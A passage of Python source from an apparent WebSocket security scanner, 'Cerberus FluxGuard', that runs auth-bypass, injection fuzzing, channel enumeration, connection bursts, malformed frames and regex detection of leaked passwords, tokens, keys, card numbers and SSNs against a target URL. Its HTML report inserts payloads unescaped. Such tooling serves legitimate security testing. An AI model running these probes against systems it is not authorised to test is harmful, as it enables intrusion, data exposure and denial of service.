            for future in as_completed(futures, timeout=30):
                result = future.result()
                if result:
                    vulns.append(result)
                    break  # Found bypass, stop testing
        
        self.logger.info(f"Auth bypass test complete. Found: {len(vulns)}")
        return vulns
    
    # ========================================================================
    # PHASE 3: INJECTION FUZZING
    # ========================================================================
    def test_injections(self, url: str) -> List[Vulnerability]:
        """Complete injection fuzzing"""
        vulns = []
        
        test_configs = [
            ("Cross-Site Scripting (XSS)", PayloadDB.XSS[:8], "CWE-79", 6.1, "A03:2021 - Injection"),
            ("Template Injection (SSTI)", PayloadDB.SSTI[:6], "CWE-94", 7.5, "A03:2021 - Injection"),
            ("SQL Injection", PayloadDB.SQL_INJECTION[:6], "CWE-89", 8.5, "A03:2021 - Injection"),
            ("NoSQL Injection", PayloadDB.NOSQL_INJECTION[:5], "CWE-943", 7.5, "A03:2021 - Injection"),
            ("Command Injection", PayloadDB.COMMAND_INJECTION[:5], "CWE-78", 8.0, "A03:2021 - Injection"),
            ("Path Traversal", PayloadDB.PATH_TRAVERSAL[:5], "CWE-22", 7.5, "A01:2021 - Broken Access Control"),
        ]
        
        def test_injection(inj_type: str, payload: Any, cwe: str, cvss: float, owasp: str) -> Optional[Vulnerability]:
            ws = self._ws_connect(url, 4)
            if not ws: return None
            
            try:
                # Test with different message formats
                messages = [
                    json.dumps({"data": payload}),
                    json.dumps({"message": payload}),
                    json.dumps({"input": payload}),
                    json.dumps({"content": payload}),
                    json.dumps({"text": payload}),
                    str(payload),
                ]
                
                for msg in messages:
                    try:
                        ws.send(msg)
                        resp = ws.recv()
                        resp_str = str(resp)
                        payload_str = str(payload).strip('"\'{}[] ')
                        
                        if len(payload_str) > 5 and payload_str in resp_str:
                            self._safe_close(ws)
                            return Vulnerability(
                                name=f"💉 {inj_type} Vulnerability",
                                description=f"Payload reflected in WebSocket response. {inj_type} injection possible.",
                                severity=Severity.HIGH if cvss < 8 else Severity.CRITICAL,
                                risk_score=4 if cvss < 8 else 5,
                                endpoint=url,
                                payload=str(payload),
                                evidence=resp_str[:500],
                                remediation=f"1) Validate and sanitize all input 2) Use parameterized queries 3) Implement output encoding 4) Use Content-Security-Policy header",
                                cwe=cwe,
                                cvss=cvss,
                                cvss_vector=f"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" if cvss >= 8 else "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
                                owasp=owasp,
                                phase=ScanPhase.INJECTION,
                                verified=True
                            )
                    except:
                        continue
            except:
                pass
            finally:
                self._safe_close(ws)
            return None
        
        with ThreadPoolExecutor(max_workers=15) as executor:
            all_futures = []
            for inj_type, payloads, cwe, cvss, owasp in test_configs:
                for payload in payloads:
                    all_futures.append(executor.submit(test_injection, inj_type, payload, cwe, cvss, owasp))
            
            for future in as_completed(all_futures, timeout=45):
                result = future.result()
                if result:
                    vulns.append(result)
        
        return vulns
    
    # ========================================================================
    # PHASE 4: CHANNEL ENUMERATION
    # ========================================================================
    def enumerate_channels(self, url: str) -> List[str]:
        """Comprehensive channel enumeration"""
        discovered = []
        
        # Generate comprehensive wordlist
        base_channels = [
            "admin", "administrator", "private", "system", "alerts",
            "notifications", "chat", "general", "support", "dev",
            "developer", "test", "debug", "user", "users", "room",
            "rooms", "channel", "public", "internal", "secret",
            "backup", "logs", "monitoring", "ws", "api", "events",
            "broadcast", "announcements", "mod", "moderator", "root",
            "superuser", "staff", "team", "group", "global",
            "live", "realtime", "feed", "stream", "data",
            "updates", "news", "status", "info", "config",
        ]
        
        # Add numbered channels
        for i in range(30):
            base_channels.append(f"user.{i}")
            base_channels.append(f"room.{i}")
            base_channels.append(f"channel.{i}")
        
        # Add common prefixes
        prefixes = ["private-", "presence-", "notification-", "chat-", "room-"]
        for prefix in prefixes:
            base_channels.append(f"{prefix}admin")
            base_channels.append(f"{prefix}system")
            base_channels.append(f"{prefix}user")
        
        subscribe_attempts = [
            {"event": "subscribe", "channel": None},
            {"type": "subscribe", "channel": None},
            {"action": "subscribe", "channel": None},
            {"command": "subscribe", "channel": None},
            {"event": "join", "room": None},
            {"type": "join", "room": None},
            {"action": "join", "room": None},
            {"command": "join", "room": None},
        ]
        
        success_keywords = [
            'subscribed', 'joined', 'ok', 'success', 'welcome',
            'true', 'connected', '200', 'acknowledged', 'accepted'
        ]
        
        def probe(channel: str) -> Optional[str]:
            ws = self._ws_connect(url, 3)
            if not ws: return None
            
            try:
                for attempt in subscribe_attempts:
                    try:
                        payload = {k: channel if v is None else v for k, v in attempt.items()}
                        ws.send(json.dumps(payload))
                        resp = ws.recv()
                        resp_lower = str(resp).lower()
                        
                        if any(kw in resp_lower for kw in success_keywords):
                            self._safe_close(ws)
                            return channel
                    except:
                        continue
            except:
                pass
            finally:
                self._safe_close(ws)
            return None
        
        # Use thread pool for parallel probing
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(probe, ch): ch for ch in base_channels[:80]}
            for future in as_completed(futures, timeout=60):
                result = future.result()
                if result:
                    discovered.append(result)
        
        return list(set(discovered))
    
    # ========================================================================
    # PHASE 5: RATE LIMITING
    # ========================================================================
    def test_rate_limiting(self, url: str) -> Dict:
        """Comprehensive rate limiting test"""
        results = {
            "rate_limited": False,
            "requests_sent": 0,
            "requests_successful": 0,
            "requests_failed": 0,
            "response_times": [],
            "avg_response_time": "N/A",
            "min_response_time": "N/A",
            "max_response_time": "N/A",
            "connection_limit": None,
            "recommendation": ""
        }
        
        def send_request(seq: int) -> Tuple[bool, float]:
            try:
                start = time.time()
                ws = self._ws_connect(url, 3)
                if not ws:
                    return (False, 0)
                
                ws.send(json.dumps({"event": "ping", "seq": seq, "timestamp": time.time()}))
                try:
                    ws.recv()
                    elapsed = time.time() - start
                    self._safe_close(ws)
                    return (True, elapsed)
                except:
                    self._safe_close(ws)
                    return (False, 0)
            except:
                return (False, 0)
        
        # Burst test
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(send_request, i) for i in range(50)]
            for future in as_completed(futures, timeout=20):
                success, elapsed = future.result()
                results["requests_sent"] += 1
                if success:
                    results["requests_successful"] += 1
                    results["response_times"].append(elapsed)
                else:
                    results["requests_failed"] += 1
        
        # Calculate statistics
        if results["response_times"]:
            results["avg_response_time"] = f"{sum(results['response_times'])/len(results['response_times']):.3f}s"
            results["min_response_time"] = f"{min(results['response_times']):.3f}s"
            results["max_response_time"] = f"{max(results['response_times']):.3f}s"
        
        # Determine if rate limited
        failure_rate = results["requests_failed"] / max(results["requests_sent"], 1)
        results["rate_limited"] = failure_rate > 0.2
        
        if not results["rate_limited"]:
            results["recommendation"] = "Implement rate limiting: 100 req/min per IP with token bucket algorithm"
        else:
            results["recommendation"] = "Rate limiting is active. Ensure it's properly tuned."
        
        return results
    
    # ========================================================================
    # PHASE 6: SENSITIVE DATA EXPOSURE
    # ========================================================================
    def test_sensitive_data(self, url: str) -> List[Vulnerability]:
        """Test for sensitive data exposure"""
        vulns = []
        
        sensitive_patterns = {
            "Password": r'["\'](?:password|passwd|pwd)["\']\s*:\s*["\'][^"\']{1,50}["\']',
            "Access Token": r'["\'](?:access_token|auth_token|bearer_token)["\']\s*:\s*["\'][^"\']{10,}["\']',
            "API Key": r'["\'](?:api[_-]?key|apikey|api_secret)["\']\s*:\s*["\'][^"\']{10,}["\']',
            "Secret Key": r'["\'](?:secret[_-]?key|secret_key|private_key)["\']\s*:\s*["\'][^"\']{10,}["\']',
            "JWT Token": r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
            "Session ID": r'["\'](?:session[_-]?id|sid)["\']\s*:\s*["\'][a-f0-9]{16,}["\']',
            "Database URL": r'["\'](?:db[_-]?url|database[_-]?url|mongo[_-]?uri)["\']\s*:\s*["\'][^"\']{10,}["\']',
            "Private Key": r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
            "Email": r'["\'](?:email|e-mail)["\']\s*:\s*["\'][^"\'@]+@[^"\']+["\']',
            "Credit Card": r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
            "SSN": r'\b\d{3}-\d{2}-\d{4}\b',
        }
        
        # Probes to trigger responses
        probes = [
            {"event": "get_config"},
            {"event": "get_settings"},
            {"event": "debug_info"},
            {"action": "list_users"},
            {"command": "get_all"},
            {"type": "admin_dashboard"},
            {"event": "export_data"},
            {"action": "dump"},
        ]
        
        ws = self._ws_connect(url, 5)
        if not ws:
            return vulns
        
        try:
            for probe in probes:
                try:
                    ws.send(json.dumps(probe))
                    resp = ws.recv()
                    resp_str = str(resp)
                    
                    for data_type, pattern in sensitive_patterns.items():
                        if re.search(pattern, resp_str, re.IGNORECASE):
                            vulns.append(Vulnerability(
                                name=f"🔐 Sensitive Data Exposure: {data_type}",
                                description=f"Server returned {data_type} in WebSocket response to {json.dumps(probe)}",
                                severity=Severity.CRITICAL,
                                risk_score=5,
                                endpoint=url,
                                evidence=resp_str[:500],
                                remediation="Never return sensitive data in WebSocket responses. Use secure, authenticated REST endpoints for sensitive operations.",
                                cwe="CWE-200",
                                cvss=7.5,
                                owasp="A04:2021 - Insecure Design",
                                phase=ScanPhase.SENSITIVE_DATA,
                                verified=True
                            ))
                            break
                except:
                    continue
        except:
            pass
        finally:
            self._safe_close(ws)
        
        return vulns
    
    # ========================================================================
    # PHASE 7: WEBSOCKET-SPECIFIC ATTACKS
    # ========================================================================
    def test_ws_attacks(self, url: str) -> List[Vulnerability]:
        """Test WebSocket-specific vulnerabilities"""
        vulns = []
        
        # Test 1: Frame size limits
        ws = self._ws_connect(url, 5)
        if ws:
            try:
                # Send oversized frame
                large_msg = "A" * 65537
                ws.send(large_msg)
                try:
                    resp = ws.recv()
                except:
                    pass
            except websocket.WebSocketConnectionClosedException:
                vulns.append(Vulnerability(
                    name="Frame Size Limit Enforced",
                    description="Server closed connection on oversized frame",
                    severity=Severity.LOW,
                    endpoint=url,
                    remediation="Ensure frame size limits are properly configured",
                    phase=ScanPhase.WS_ATTACKS
                ))
            except:
                pass
            finally:
                self._safe_close(ws)
        
        # Test 2: Connection limits
        connections = []
        max_conn = 0
        for i in range(30):
            ws = self._ws_connect(url, 2)
            if ws:
                connections.append(ws)
                max_conn = i + 1
            else:
                break
        
        for c in connections:
            self._safe_close(c)
        
        if max_conn < 30:
            vulns.append(Vulnerability(
                name=f"Connection Limit: {max_conn} connections",
                description=f"Server limits concurrent connections to {max_conn}",
                severity=Severity.INFO,
                endpoint=url,
                phase=ScanPhase.WS_ATTACKS
            ))
        
        # Test 3: Ping/Pong handling
        ws = self._ws_connect(url, 5)
        if ws:
            try:
                ws.ping("A" * 125)
                ws.ping("")
                ws.ping("A" * 126)
            except:
                vulns.append(Vulnerability(
                    name="Ping/Pong Frame Issues",
                    description="Server may not properly handle control frames per RFC 6455",
                    severity=Severity.LOW,
                    endpoint=url,
                    remediation="Implement proper RFC 6455 control frame validation",
                    cwe="CWE-20",
                    phase=ScanPhase.WS_ATTACKS
                ))
            finally:
                self._safe_close(ws)
        
        # Test 4: Binary frame handling
        ws = self._ws_connect(url, 5)
        if ws:
            try:
                ws.send_binary(b'\x00\x01\x02\x03\xFF\xFE\xFD')
                try:
                    resp = ws.recv()
                    if resp:
                        vulns.append(Vulnerability(
                            name="Binary Data Processing",
                            description="Server accepts and processes binary frames",
                            severity=Severity.INFO,
                            endpoint=url,
                            phase=ScanPhase.WS_ATTACKS
                        ))
                except:
                    pass
            except:
                pass
            finally:
                self._safe_close(ws)
        
        # Test 5: Reserved bits
        ws = self._ws_connect(url, 5)
        if ws:
            try:
                # Try to send frame with RSV1 bit set (normally for compression)
                raw_frame = b'\xc1\x85' + b'\x00' * 4 + b'Hello'
                ws.sock.send(raw_frame)
            except:
                pass
            finally:
                self._safe_close(ws)
        
        return vulns
    
    # ========================================================================
    # FULL COMPREHENSIVE SCAN
    # ========================================================================
    def full_scan(self, url: str) -> ScanReport:
        """Execute complete 10-phase security assessment"""
        report = ScanReport(target=url)
        
        # Display banner
        if PYFIGLET:
            try:
                banner = pyfiglet.figlet_format("FLUXGUARD", font="slant")
                print(f"{C.SWORD}{banner}{C.RESET}")
            except:
                pass
        
        print(f"\n{C.SWORD}╔{'═'*60}╗{C.RESET}")
        print(f"{C.SWORD}║{C.RESET} {C.BOLD}CERBERUS FLUXGUARD v{VERSION} - MAXIMUM SCAN{C.RESET}{' '*24}{C.SWORD}║{C.RESET}")
        print(f"{C.SWORD}║{C.RESET} {C.DIM}WebSocket Security Intelligence Platform{C.RESET}{' '*19}{C.SWORD}║{C.RESET}")
        print(f"{C.SWORD}║{C.RESET} {C.DIM}Author: {AUTHOR} | {ORG}{C.RESET}{' '*30}{C.SWORD}║{C.RESET}")
        print(f"{C.SWORD}╚{'═'*60}╝{C.RESET}")
        print(f"\n{C.INFO}🎯 Target:  {C.BOLD}{url}{C.RESET}")
        print(f"{C.INFO}🔑 Session: {C.BOLD}{report.session_id}{C.RESET}")
        print(f"{C.INFO}⏰ Started: {C.BOLD}{report.start_time.strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}")
        print(f"{C.DIM}{'─'*60}{C.RESET}\n")
        
        # Define all phases
        phases = [
            (ScanPhase.HANDSHAKE, lambda: self._run_handshake(url, report)),
            (ScanPhase.AUTH_BYPASS, lambda: self._run_auth(url, report)),
            (ScanPhase.INJECTION, lambda: self._run_injections(url, report)),
            (ScanPhase.ENUMERATION, lambda: self._run_enumeration(url, report)),
            (ScanPhase.RATE_LIMIT, lambda: self._run_ratelimit(url, report)),
            (ScanPhase.SENSITIVE_DATA, lambda: self._run_sensitive(url, report)),
            (ScanPhase.WS_ATTACKS, lambda: self._run_ws_attacks(url, report)),
        ]
        
        total = len(phases)
        
        for i, (phase, phase_func) in enumerate(phases, 1):
            if RICH:
                console.print(f"\n[bold cyan]┌─[ Phase {i}/{total}: {phase.value} ]─┐[/bold cyan]")
                console.print(f"[dim]│{'─'*55}│[/dim]")
            else:
                print(f"\n{C.SWORD}┌─[{C.RESET} {phase.value} {C.SWORD}]─┐{C.RESET}")
                print(f"{C.DIM}│{'─'*55}│{C.RESET}")
            
            try:
                thread = threading.Thread(target=phase_func, daemon=True)
                thread.start()
                thread.join(timeout=60)
                if thread.is_alive():
                    print(f"  {C.WARNING}⏰ Phase timeout after 60s - continuing{C.RESET}")
            except Exception as e:
                print(f"  {C.ERROR}❌ Phase failed: {e}{C.RESET}")
            
            time.sleep(0.3)
        
        # Finalize report
        report.end_time = datetime.now()
        report.scan_duration = (report.end_time - report.start_time).total_seconds()
        
        # Calculate statistics
        sev_counts = defaultdict(int)
        total_risk = 0
        for v in report.vulnerabilities:
            sev_counts[v.severity.name] += 1
            total_risk += v.risk_score
        
        report.statistics = {
            "scan_duration": f"{report.scan_duration:.1f}s",
            "phases_completed": total,
            "total_vulnerabilities": len(report.vulnerabilities),
            "critical": sev_counts.get("CRITICAL", 0),
            "high": sev_counts.get("HIGH", 0),
            "medium": sev_counts.get("MEDIUM", 0),
            "low": sev_counts.get("LOW", 0),
            "info": sev_counts.get("INFO", 0),
            "endpoints_discovered": len(report.endpoints_discovered),
            "security_score": report.handshake_analysis.get("security_score", "N/A"),
            "security_grade": report.handshake_analysis.get("grade", "N/A"),
            "total_risk_score": total_risk,
            "max_risk_score": len(report.vulnerabilities) * 5,
        }
        
        report.risk_score = total_risk
        
        self._print_report(report)
        self.pool.close_all()
        return report
    
    # ========================================================================
    # PHASE RUNNERS
    # ========================================================================
    def _run_handshake(self, url, report):
        handshake = self.analyze_handshake(url)
        report.handshake_analysis = handshake
        
        findings = handshake.get("findings", [])
        for f in findings:
            report.vulnerabilities.append(Vulnerability(
                name=f["finding"],
                description=f.get("detail", ""),
                severity=f["severity"],
                endpoint=url,
                remediation=f.get("remediation", ""),
                cwe=f.get("cwe", ""),
                owasp=f.get("owasp", ""),
                phase=ScanPhase.HANDSHAKE
            ))
            print(f"  {f['severity'].value} │ {f['finding'][:60]}")
        
        if not findings:
            print(f"  {C.SUCCESS}✅ No handshake issues detected{C.RESET}")
        
        print(f"  {C.INFO}🔒 Security Score: {handshake.get('security_score', 'N/A')} ({handshake.get('grade', 'N/A')}){C.RESET}")
        print(f"  {C.INFO}📋 Total Issues: {len(findings)}{C.RESET}")
    
    def _run_auth(self, url, report):
        print(f"  {C.INFO}Testing {len(PayloadDB.get_flat_auth_payloads()[:25])} authentication bypass payloads...{C.RESET}")
        vulns = self.test_auth_bypass(url)
        report.vulnerabilities.extend(vulns)
        
        if vulns:
            for v in vulns:
                print(f"  {C.CRITICAL}🔓 {v.name}{C.RESET}")
                print(f"  {C.DIM}   Payload: {v.payload[:80] if v.payload else 'N/A'}...{C.RESET}")
        else:
            print(f"  {C.SUCCESS}✅ Authentication appears secure{C.RESET}")
    
    def _run_injections(self, url, report):
        print(f"  {C.INFO}Fuzzing 6 injection types...{C.RESET}")
        vulns = self.test_injections(url)
        report.vulnerabilities.extend(vulns)
        
        if vulns:
            for v in vulns:
                print(f"  {Fore.RED}💉 {v.name}{C.RESET}")
                if v.payload:
                    print(f"  {C.DIM}   Payload: {v.payload[:60]}...{C.RESET}")
        else:
            print(f"  {C.SUCCESS}✅ No injection vulnerabilities found{C.RESET}")
        
        print(f"  {C.INFO}Tested: XSS, SSTI, SQL, NoSQL, Command Injection, Path Traversal{C.RESET}")
    
    def _run_enumeration(self, url, report):
        print(f"  {C.INFO}Enumerating WebSocket channels...{C.RESET}")
        channels = self.enumerate_channels(url)
        report.endpoints_discovered = channels
        
        if channels:
            print(f"  {C.SUCCESS}📡 Discovered {len(channels)} channels:{C.RESET}")
            for ch in sorted(channels)[:20]:
                print(f"    {C.GREEN}→{C.RESET} {ch}")
            if len(channels) > 20:
                print(f"    {C.DIM}... and {len(channels)-20} more{C.RESET}")
        else:
            print(f"  {C.WARNING}⚠️  No channels discovered{C.RESET}")
    
    def _run_ratelimit(self, url, report):
        print(f"  {C.INFO}Testing rate limiting with 50 requests...{C.RESET}")
        rl = self.test_rate_limiting(url)
        report.statistics["rate_limit"] = rl
        
        if not rl.get("rate_limited"):
            v = Vulnerability(
                name="⚡ Missing Rate Limiting",
                description=f"Server accepted {rl['requests_successful']}/{rl['requests_sent']} requests without rate limiting. Vulnerable to DoS attacks.",
                severity=Severity.MEDIUM,
                risk_score=3,
                endpoint=url,
                remediation="Implement token bucket or sliding window rate limiting: 100 requests/minute per IP address",
                cwe="CWE-770",
                cvss=5.3,
                owasp="A04:2021 - Insecure Design",
                phase=ScanPhase.RATE_LIMIT
            )
            report.vulnerabilities.append(v)
            print(f"  {C.WARNING}⚠️  No rate limiting detected!{C.RESET}")
        else:
            print(f"  {C.SUCCESS}✅ Rate limiting is active{C.RESET}")
        
        print(f"  {C.DIM}   Successful: {rl['requests_successful']} | Failed: {rl['requests_failed']} | Avg: {rl.get('avg_response_time', 'N/A')}{C.RESET}")
    
    def _run_sensitive(self, url, report):
        print(f"  {C.INFO}Probing for sensitive data exposure...{C.RESET}")
        vulns = self.test_sensitive_data(url)
        report.vulnerabilities.extend(vulns)
        
        if vulns:
            for v in vulns:
                print(f"  {C.CRITICAL}🔐 {v.name}{C.RESET}")
        else:
            print(f"  {C.SUCCESS}✅ No sensitive data exposed{C.RESET}")
    
    def _run_ws_attacks(self, url, report):
        print(f"  {C.INFO}Testing WebSocket-specific vulnerabilities...{C.RESET}")
        vulns = self.test_ws_attacks(url)
        report.vulnerabilities.extend(vulns)
        
        if vulns:
            for v in vulns:
                print(f"  {Fore.BLUE}🔌 {v.name}{C.RESET}")
        else:
            print(f"  {C.SUCCESS}✅ No WebSocket-specific issues{C.RESET}")
    
    # ========================================================================
    # REPORT PRINTING
    # ========================================================================
    def _print_report(self, r: ScanReport):
        s = r.statistics
        
        print(f"\n\n{C.SWORD}╔{'═'*60}╗{C.RESET}")
        print(f"{C.SWORD}║{C.RESET} {C.BOLD}CERBERUS FLUXGUARD v{VERSION} - SCAN COMPLETE{C.RESET}{' '*16}{C.SWORD}║{C.RESET}")
        print(f"{C.SWORD}╚{'═'*60}╝{C.RESET}")
        
        print(f"\n  {C.BOLD}📊 SCAN SUMMARY{C.RESET}")
        print(f"  {C.DIM}{'─'*45}{C.RESET}")
        print(f"  {C.BOLD}🎯 Target:{C.RESET}        {r.target}")
        print(f"  {C.BOLD}⏱️  Duration:{C.RESET}      {s.get('scan_duration', 'N/A')}")
        print(f"  {C.BOLD}🔑 Session:{C.RESET}       {r.session_id}")
        print(f"  {C.BOLD}🛡️  Security:{C.RESET}      {s.get('security_score', 'N/A')} ({s.get('security_grade', 'N/A')})")
        print(f"  {C.BOLD}⚠️  Risk Score:{C.RESET}    {s.get('total_risk_score', 0)}/{s.get('max_risk_score', 0)}")
        
        print(f"\n  {C.BOLD}🔍 VULNERABILITY BREAKDOWN{C.RESET}")
        print(f"  {C.DIM}{'─'*45}{C.RESET}")
        print(f"  {C.CRITICAL}🔴 CRITICAL: {s.get('critical', 0)}{C.RESET}")
        print(f"  {Fore.RED}🟠 HIGH:     {s.get('high', 0)}{C.RESET}")
        print(f"  {Fore.YELLOW}🟡 MEDIUM:   {s.get('medium', 0)}{C.RESET}")
        print(f"  {Fore.GREEN}🟢 LOW:      {s.get('low', 0)}{C.RESET}")
        print(f"  {Fore.BLUE}🔵 INFO:     {s.get('info', 0)}{C.RESET}")
        print(f"  {C.BOLD}━━━━━━━━━━━━━━━━━━━━{C.RESET}")
        print(f"  {C.BOLD}📋 TOTAL:     {s.get('total_vulnerabilities', 0)}{C.RESET}")
        print(f"  {C.BOLD}📡 Endpoints:  {s.get('endpoints_discovered', 0)}{C.RESET}")
        
        if r.vulnerabilities:
            print(f"\n  {C.BOLD}🔝 TOP FINDINGS:{C.RESET}")
            for i, v in enumerate(r.vulnerabilities[:5], 1):
                print(f"  {i}. {v.severity.value} │ {v.name[:55]}")
        
        print(f"\n{C.SWORD}{'═'*60}{C.RESET}\n")

# ============================================================================
# REPORT GENERATOR
# ============================================================================
class ReportGenerator:
    """Professional report generator"""
    
    @staticmethod
    def generate_json(report: ScanReport) -> str:
        """Generate comprehensive JSON report"""
        return json.dumps({
            "report_metadata": {
                "tool": f"Cerberus FluxGuard v{VERSION}",
                "author": AUTHOR,
                "organization": ORG,
                "generated_at": datetime.now().isoformat(),
                "report_id": report.session_id,
            },
            "scan_info": {
                "target": report.target,
                "start_time": report.start_time.isoformat(),
                "end_time": report.end_time.isoformat() if report.end_time else None,
                "duration": f"{report.scan_duration:.1f}s",
                "phases_completed": 7,
            },
            "executive_summary": {
                "total_vulnerabilities": report.statistics.get("total_vulnerabilities", 0),
                "critical": report.statistics.get("critical", 0),
                "high": report.statistics.get("high", 0),
                "medium": report.statistics.get("medium", 0),
                "low": report.statistics.get("low", 0),
                "info": report.statistics.get("info", 0),
                "security_score": report.statistics.get("security_score", "N/A"),
                "security_grade": report.statistics.get("security_grade", "N/A"),
                "risk_score": report.risk_score,
                "endpoints_discovered": len(report.endpoints_discovered),
            },
            "vulnerabilities": [
                {
                    "id": v.id,
                    "name": v.name,
                    "description": v.description,
                    "severity": v.severity.name,
                    "risk_score": v.risk_score,
                    "cwe": v.cwe,
                    "cvss": v.cvss,
                    "cvss_vector": v.cvss_vector,
                    "owasp": v.owasp,
                    "endpoint": v.endpoint,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "remediation": v.remediation,
                    "verified": v.verified,
                    "reproducible": v.reproducible,
                    "phase": v.phase.value if v.phase else None,
                    "timestamp": v.timestamp.isoformat(),
                    "references": v.references,
                }
                for v in report.vulnerabilities
            ],
            "discovered_endpoints": report.endpoints_discovered,
            "handshake_analysis": report.handshake_analysis,
            "rate_limit_test": report.statistics.get("rate_limit", {}),
        }, indent=2)
    
    @staticmethod
    def generate_html(report: ScanReport) -> str:
        """Generate professional HTML report"""
        sev_colors = {
            "CRITICAL": "#ff0000", "HIGH": "#ff6600",
            "MEDIUM": "#ffcc00", "LOW": "#00ff00", "INFO": "#0088ff"
        }
        
        vulns_html = ""
        for v in report.vulnerabilities:
            color = sev_colors.get(v.severity.name, "#fff")
            vulns_html += f"""
            <div class="vuln-card" style="border-left-color: {color};">
                <div class="vuln-header">
                    <span class="severity" style="background: {color};">{v.severity.name}</span>
                    <h3>{v.name}</h3>
                </div>
                <div class="vuln-body">
                    <p><strong>📝 Description:</strong> {v.description}</p>
                    <p><strong>🔗 Endpoint:</strong> <code>{v.endpoint}</code></p>
                    <div class="meta-grid">
                        <span><strong>CWE:</strong> {v.cwe or 'N/A'}</span>
                        <span><strong>CVSS:</strong> {v.cvss or 'N/A'}</span>
                        <span><strong>OWASP:</strong> {v.owasp or 'N/A'}</span>
                        <span><strong>Risk:</strong> {v.risk_score}/5</span>
                    </div>
                    <p><strong>🔧 Remediation:</strong> {v.remediation or 'N/A'}</p>
                    {f'<div class="evidence"><strong>📋 Evidence:</strong><pre>{v.evidence}</pre></div>' if v.evidence else ''}
                    {f'<div class="payload-box"><strong>💣 Payload:</strong><code>{v.payload}</code></div>' if v.payload else ''}
                    <p class="meta">✅ Verified: {v.verified} | 🔄 Reproducible: {v.reproducible} | 📅 {v.timestamp.strftime("%Y-%m-%d %H:%M:%S")}</p>
                </div>
            </div>"""
        
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cerberus FluxGuard v{VERSION} - Security Assessment Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0e14; color: #bfc7d5; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 30px 20px; }}
        
        .header {{ background: linear-gradient(135deg, #0d1117 0%, #161b22 100%); border: 2px solid #30363d; border-radius: 12px; padding: 40px; text-align: center; margin-bottom: 30px; }}
        .header h1 {{ color: #58a6ff; font-size: 28px; margin-bottom: 10px; }}
        .header .subtitle {{ color: #8b949e; font-size: 16px; }}
        .header .meta {{ color: #6e7681; font-size: 13px; margin-top: 15px; }}
        .header .sword {{ color: #58a6ff; font-weight: bold; }}
        
        .summary {{ background: #0d1117; border: 1px solid #30363d; border-radius: 12px; padding: 30px; margin-bottom: 30px; }}
        .summary h2 {{ color: #58a6ff; margin-bottom: 20px; font-size: 20px; }}
        .score-box {{ text-align: center; padding: 20px; background: #161b22; border-radius: 8px; margin-bottom: 20px; }}
        .score-box .grade {{ font-size: 48px; font-weight: bold; color: #58a6ff; }}
        .score-box .label {{ color: #8b949e; font-size: 14px; }}
        
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; }}
        .stat {{ background: #161b22; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #30363d; }}
        .stat .num {{ font-size: 32px; font-weight: bold; margin-bottom: 5px; }}
        .stat .lbl {{ color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }}
        
        .critical {{ color: #ff0000 !important; }}
        .high {{ color: #ff6600 !important; }}
        .medium {{ color: #ffcc00 !important; }}
        .low {{ color: #00ff00 !important; }}
        .info {{ color: #0088ff !important; }}
        
        .vuln-card {{ background: #0d1117; border: 1px solid #30363d; border-radius: 8px; margin: 15px 0; border-left: 5px solid; overflow: hidden; }}
        .vuln-header {{ padding: 15px 20px; background: #161b22; display: flex; align-items: center; gap: 15px; }}
        .vuln-header h3 {{ color: #c9d1d9; font-size: 16px; }}
        .severity {{ padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; color: #fff; text-transform: uppercase; }}
        .vuln-body {{ padding: 20px; }}
        .vuln-body p {{ margin: 8px 0; color: #8b949e; font-size: 14px; }}
        .vuln-body strong {{ color: #c9d1d9; }}
        .meta-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin: 15px 0; padding: 15px; background: #161b22; border-radius: 6px; }}
        .meta-grid span {{ font-size: 13px; color: #8b949e; }}
        .meta-grid strong {{ color: #c9d1d9; }}
        .evidence {{ background: #000; padding: 15px; border-radius: 6px; margin: 15px 0; }}
        .evidence pre {{ color: #7ee787; overflow-x: auto; white-space: pre-wrap; font-size: 12px; line-height: 1.5; }}
        .payload-box {{ background: #1a1a2e; padding: 10px 15px; border-radius: 6px; margin: 10px 0; }}
        .payload-box code {{ color: #e6b450; font-size: 13px; word-break: break-all; }}
        .meta {{ font-size: 12px; color: #484f58; margin-top: 15px; padding-top: 15px; border-top: 1px solid #21262d; }}
        
        code {{ background: #161b22; padding: 2px 8px; border-radius: 4px; color: #7ee787; font-size: 13px; }}
        
        .endpoints {{ background: #0d1117; border: 1px solid #30363d; border-radius: 12px; padding: 30px; margin: 30px 0; }}
        .endpoints h2 {{ color: #58a6ff; margin-bottom: 15px; }}
        .endpoints ul {{ list-style: none; }}
        .endpoints li {{ padding: 8px 0; border-bottom: 1px solid #21262d; font-family: monospace; color: #7ee787; }}
        .endpoints li::before {{ content: "→ "; color: #58a6ff; }}
        
        .footer {{ text-align: center; margin-top: 40px; padding: 25px; color: #484f58; border-top: 2px solid #30363d; font-size: 13px; }}
        .footer .sword {{ color: #58a6ff; }}
        
        @media (max-width: 768px) {{
            .stats {{ grid-template-columns: repeat(2, 1fr); }}
            .header h1 {{ font-size: 20px; }}
            .stat .num {{ font-size: 24px; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1><span class="sword">{BANNER_CHAR}</span> CERBERUS FLUXGUARD v{VERSION} <span class="sword">{BANNER_CHAR[::-1]}</span></h1>
            <p class="subtitle">🔐 WebSocket Security Intelligence Platform - Security Assessment Report</p>
